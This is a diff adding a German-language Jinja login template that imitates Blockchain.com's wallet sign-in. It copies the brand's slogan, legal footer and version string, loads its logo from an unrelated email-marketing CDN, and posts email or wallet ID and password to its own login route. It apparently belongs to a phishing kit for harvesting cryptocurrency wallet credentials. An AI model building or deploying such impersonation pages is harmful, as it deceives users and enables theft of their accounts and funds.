@@ -1,0 +1,54 @@
+{% extends '_base.html' %}
+{% block title %}Anmelden{% endblock %}
+{% block body %}
+<div class="bc-login">
+  <div class="bc-login__top">
+    <a href="#">Bei Exchange anmelden</a>
+  </div>
+
+  <div class="bc-login__center">
+    <div class="bc-login__logo">
+      <img src="https://cdn.emailacademy.com/user/f063785d8ad9c8f671bbb86fb1ac7c4625fbbd5f851755f61646448c2e70d748/BCDC2026_06_20_20_32_55.png" alt="Blockchain">
+      Blockchain
+    </div>
+
+    <div class="bc-login__card">
+      <div class="bc-login__head">
+        <div class="bc-login__title">
+          {% if step == 'password' %}Geben Sie Ihr Passwort ein{% else %}Anmelden oder registrieren{% endif %}
+        </div>
+        <svg class="bc-login__qr" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/>
+          <rect x="3" y="14" width="7" height="7"/>
+          <path d="M14 14h3v3h-3zM18 18h3v3h-3zM14 18h3M18 14v3"/>
+        </svg>
+      </div>
+      <div class="bc-login__sub">Be Your Own Bank®</div>
+
+      <form method="post" action="{{ url_for('login') }}">
+        {% if step == 'password' %}
+          <input type="hidden" name="email" value="{{ email }}">
+          <div class="bc-login__label">Passwort für {{ email }}</div>
+          <input class="bc-login__input" type="password" name="password" autofocus required placeholder="Passwort">
+          {% if error %}<div class="bc-login__error">{{ error }}</div>{% endif %}
+          <button class="bc-login__btn" type="submit">Anmelden</button>
+        {% else %}
+          <div class="bc-login__label">E-Mail oder Wallet-ID</div>
+          <input class="bc-login__input" type="text" name="email" autofocus required
+                 value="{{ email or '' }}" placeholder="Geben Sie Ihre E-Mail oder Wallet-ID ein">
+          {% if error %}<div class="bc-login__error">{{ error }}</div>{% endif %}
+          <button class="bc-login__btn" type="submit">Fortfahren</button>
+        {% endif %}
+      </form>
+    </div>
+  </div>
+
+  <div class="bc-login__foot">
+    Mit dem Fortfahren stimmen Sie den Blockchain.com
+    <a href="#">Nutzungsbedingungen</a>,
+    <a href="#">Datenschutzrichtlinie</a> &amp;
+    <a href="#">Risikohinweis</a> zu.
+    <div class="bc-login__copy">© Blockchain.com. Alle Rechte vorbehalten. Version v5.0.231.2   |   DE Deutsch</div>
+  </div>
+</div>
+{% endblock %}
